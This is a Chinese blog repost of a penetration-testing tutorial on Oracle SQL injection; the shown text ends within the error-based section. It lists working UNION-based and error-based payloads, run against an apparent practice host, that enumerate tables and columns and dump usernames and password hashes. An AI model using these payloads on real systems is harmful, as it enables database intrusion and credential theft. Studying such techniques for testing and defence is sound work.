<script type="text/javascript" src="/js/crash_cheat.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Oracle数据库注入全方位利用总结(渗透必备) | jasson个人博客</title><meta name="keywords" content="数据库,web安全,oracle,sql注入"><meta name="author" content="jasson"><meta name="copyright" content="jasson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Oracle数据库注入全方位利用总结(渗透必备)">
<meta property="og:type" content="article">
<meta property="og:title" content="Oracle数据库注入全方位利用总结(渗透必备)">
<meta property="og:url" content="https://j-jasson2.github.io/2021/02/02/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="jasson个人博客">
<meta property="og:description" content="Oracle数据库注入全方位利用总结(渗透必备)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://j-jasson2.github.io/images/oracle.png">
<meta property="article:published_time" content="2021-02-02T02:45:41.000Z">
<meta property="article:modified_time" content="2021-08-07T09:21:31.738Z">
<meta property="article:author" content="jasson">
<meta property="article:tag" content="SQL注入">
<meta property="article:tag" content="数据库">
<meta property="article:tag" content="oracle">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://j-jasson2.github.io/images/oracle.png"><link rel="shortcut icon" href="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630728108&t=1576409e5f212dd7279b9a1c880c7086"><link rel="canonical" href="https://j-jasson2.github.io/2021/02/02/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Oracle数据库注入全方位利用总结(渗透必备)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-08-07 17:21:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/oracle.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jasson个人博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Oracle数据库注入全方位利用总结(渗透必备)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-02T02:45:41.000Z" title="发表于 2021-02-02 10:45:41">2021-02-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-07T09:21:31.738Z" title="更新于 2021-08-07 17:21:31">2021-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Oracle数据库注入全方位利用总结(渗透必备)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>

<blockquote>
<p>转自：先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9940">https://xz.aliyun.com/t/9940</a></p>
<p>作者：ajie</p>
</blockquote>
<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。<br>全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～</p>
<h1 id="0x02-注入点确定"><a href="#0x02-注入点确定" class="headerlink" title="0x02 注入点确定"></a>0x02 注入点确定</h1><p>跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=1%20and%201=1</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353232047-3c17c5db-589b-4002-a82a-6fbe01e576fe.png#align=left&display=inline&height=439&margin=%5Bobject%2Object%5D&name=image.png&originHeight=878&originWidth=1608&size=122915&status=done&style=none&width=804" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=1%20and%201=2</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353242702-ec873de8-7a5e-4bf6-b14f-3768ee4e8e76.png#align=left&display=inline&height=278&margin=%5Bobject%2Object%5D&name=image.png&originHeight=556&originWidth=1578&size=35308&status=done&style=none&width=789" alt="image.png"></p>
<h1 id="0x03-显错注入"><a href="#0x03-显错注入" class="headerlink" title="0x03 显错注入"></a>0x03 显错注入</h1><h2 id="1、判断字段数为2"><a href="#1、判断字段数为2" class="headerlink" title="1、判断字段数为2"></a>1、判断字段数为2</h2><p>与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=1%20order%20by%202</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353279684-e0cc78c5-4353-4770-82e2-44b3b6176214.png#align=left&display=inline&height=420&margin=%5Bobject%2Object%5D&name=image.png&originHeight=840&originWidth=1458&size=116992&status=done&style=none&width=729" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353306166-7c477672-384f-4899-ab58-d487f859a22d.png#align=left&display=inline&height=220&margin=%5Bobject%2Object%5D&name=image.png&originHeight=440&originWidth=1412&size=29793&status=done&style=none&width=706" alt="image.png"></p>
<h2 id="2、获取显错点"><a href="#2、获取显错点" class="headerlink" title="2、获取显错点"></a>2、获取显错点</h2><p>联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select ‘null’,’null’。<br>(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#联合查询</span><br><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual</span><br><span class="line">#修改null为&#x27;null&#x27;，判断字段类型均为字符型</span><br><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353537650-e294e0ca-44d5-4884-9341-27dd41eff277.png#align=left&display=inline&height=500&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1000&originWidth=2526&size=171188&status=done&style=none&width=1263" alt="image.png"><br>后续便可以替换显错点进行注入。</p>
<h2 id="3、查询数据库版本信息"><a href="#3、查询数据库版本信息" class="headerlink" title="3、查询数据库版本信息"></a>3、查询数据库版本信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual</span><br></pre></td></tr></table></figure>
<h2 id="4、获取当前数据库连接用户"><a href="#4、获取当前数据库连接用户" class="headerlink" title="4、获取当前数据库连接用户"></a>4、获取当前数据库连接用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select sys_context(&#x27;userenv&#x27;,&#x27;current_user&#x27;) from dual) from dual</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;1&#x27;,user from dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354142760-9af3da8c-9eb3-4592-9c52-24a10e962061.png#align=left&display=inline&height=347&margin=%5Bobject%2Object%5D&name=image.png&originHeight=694&originWidth=2492&size=123811&status=done&style=none&width=1246" alt="image.png"></p>
<h2 id="5、查询当前数据库库名"><a href="#5、查询当前数据库库名" class="headerlink" title="5、查询当前数据库库名"></a>5、查询当前数据库库名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354254697-9084c0a1-02ea-4da6-8f68-b579e31135fd.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=2510&size=123816&status=done&style=none&width=1255" alt="image.png"></p>
<h2 id="6、查询数据库表名"><a href="#6、查询数据库表名" class="headerlink" title="6、查询数据库表名"></a>6、查询数据库表名</h2><p>查询表名一般查询admin或者user表</p>
<h3 id="直接查询"><a href="#直接查询" class="headerlink" title="直接查询"></a>直接查询</h3><p>获取第一个表名<strong>LOGMNR_SESSION_EVOLVE$</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353844960-cad323f3-f77c-4c12-b1e8-9250896245b8.png#align=left&display=inline&height=254&margin=%5Bobject%2Object%5D&name=image.png&originHeight=508&originWidth=1252&size=21553&status=done&style=none&width=626" alt="image.png"><br>获取第二个表名<strong>LOGMNR_GLOBAL$</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353863561-54f3d94e-8596-40c9-9f49-d2520256d80f.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&name=image.png&originHeight=476&originWidth=1166&size=18009&status=done&style=none&width=583" alt="image.png"><br>获取第三个表名<strong>LOGMNR_GT_TAB_INCLUDE$</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27; and table_name not in &#x27;LOGMNR_GLOBAL$&#x27;) from dual</span><br></pre></td></tr></table></figure>
<h3 id="模糊搜索查询"><a href="#模糊搜索查询" class="headerlink" title="模糊搜索查询"></a>模糊搜索查询</h3><p>获取sns_users表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354561532-baf25308-92eb-42f2-bc57-e95ddd2b1891.png#align=left&display=inline&height=346&margin=%5Bobject%2Object%5D&name=image.png&originHeight=692&originWidth=2496&size=125987&status=done&style=none&width=1248" alt="image.png"></p>
<h2 id="7、查询数据库列名"><a href="#7、查询数据库列名" class="headerlink" title="7、查询数据库列名"></a>7、查询数据库列名</h2><h3 id="直接查询-1"><a href="#直接查询-1" class="headerlink" title="直接查询"></a>直接查询</h3><p>获取sns_users表里的字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dual</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dual</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27;) from dual</span><br><span class="line"></span><br><span class="line">……………</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27; and column_name not in &#x27;PROTOCOL&#x27; and column_name not in &#x27;SPARE1&#x27; and column_name not in &#x27;DB_USERNAME&#x27; and column_name not in &#x27;OID&#x27; and column_name &lt;&gt; &#x27;EVENTID&#x27; and column_name &lt;&gt; &#x27;NAME&#x27; and column_name &lt;&gt; &#x27;TABLE_OBJNO&#x27;) from dual</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">获取如下字段：</span><br><span class="line">USER_NAME</span><br><span class="line">AGENT_NAME</span><br><span class="line">PROTOCOL</span><br><span class="line">SPARE1</span><br><span class="line">DB_USERNAME</span><br><span class="line">OID</span><br><span class="line">EVENTID</span><br><span class="line">NAME</span><br><span class="line">TABLE_OBJNO</span><br><span class="line">USAGE</span><br><span class="line">USER_PWD</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
<h3 id="模糊搜索查询-1"><a href="#模糊搜索查询-1" class="headerlink" title="模糊搜索查询"></a>模糊搜索查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dual</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27; and column_name &lt;&gt; &#x27;USER_NAME&#x27;) from dual</span><br></pre></td></tr></table></figure>
<h2 id="8、查询数据库数据"><a href="#8、查询数据库数据" class="headerlink" title="8、查询数据库数据"></a>8、查询数据库数据</h2><p>获取账号密码字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355758027-eb920ce1-1667-40c4-9703-bf055011ce09.png#align=left&display=inline&height=332&margin=%5Bobject%2Object%5D&name=image.png&originHeight=664&originWidth=2436&size=124453&status=done&style=none&width=1218" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355803061-53c045a9-600d-4231-911b-a0b145fd8d32.png#align=left&display=inline&height=308&margin=%5Bobject%2Object%5D&name=image.png&originHeight=616&originWidth=2470&size=127349&status=done&style=none&width=1235" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; and USER_NAME not in &#x27;hu&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355829407-d770aa94-c339-4686-8131-9c5b9910039e.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&name=image.png&originHeight=576&originWidth=2436&size=121972&status=done&style=none&width=1218" alt="image.png"><br>解密获取密码392118<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355905460-f2485164-b4a8-4419-a99f-9752107804b7.png#align=left&display=inline&height=390&margin=%5Bobject%2Object%5D&name=image.png&originHeight=780&originWidth=1526&size=108851&status=done&style=none&width=763" alt="image.png"></p>
<h2 id="9、美化输出"><a href="#9、美化输出" class="headerlink" title="9、美化输出"></a>9、美化输出</h2><p>Oracle采用||进行数据连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;用户名：&#x27;||USER_NAME,&#x27;密码：&#x27;||USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627356270321-022d9ac4-944b-4251-9f20-fa13afadd1b9.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=2512&size=124098&status=done&style=none&width=1256" alt="image.png"></p>
<h1 id="0x04-报错注入"><a href="#0x04-报错注入" class="headerlink" title="0x04 报错注入"></a>0x04 报错注入</h1><p>报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。</p>
<h2 id="1、ctxsys-drithsx-sn"><a href="#1、ctxsys-drithsx-sn" class="headerlink" title="1、ctxsys.drithsx.sn()"></a>1、ctxsys.drithsx.sn()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取当前数据库用户 ORACLE1</span><br><span class="line">?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370671892-ba68c50c-4b25-48c6-8121-2ee170485de9.png#align=left&display=inline&height=357&margin=%5Bobject%2Object%5D&name=image.png&originHeight=714&originWidth=2512&size=177516&status=done&style=none&width=1256" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库版本信息</span><br><span class="line">?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370745612-670ae342-fb32-42ff-8b48-bd894e0b6d3f.png#align=left&display=inline&height=341&margin=%5Bobject%2Object%5D&name=image.png&originHeight=682&originWidth=2492&size=195982&status=done&style=none&width=1246" alt="image.png"></p>
<h2 id="2、XMLType"><a href="#2、XMLType" class="headerlink" title="2、XMLType()"></a>2、XMLType()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464280011-c070c8c1-5831-4516-93a5-d9de8e4728b2.png#align=left&display=inline&height=466&margin=%5Bobject%2Object%5D&name=image.png&originHeight=932&originWidth=1860&size=83611&status=done&style=none&width=930" alt="image.png"></p>
<h2 id="3、dbms-xdb-version-checkin"><a href="#3、dbms-xdb-version-checkin" class="headerlink" title="3、dbms_xdb_version.checkin()"></a>3、dbms_xdb_version.checkin()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库版本信息</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370853172-60c1003a-f2bc-45e7-88e4-e1dc5b544009.png#align=left&display=inline&height=352&margin=%5Bobject%2Object%5D&name=image.png&originHeight=704&originWidth=2466&size=181678&status=done&style=none&width=1233" alt="image.png"></p>
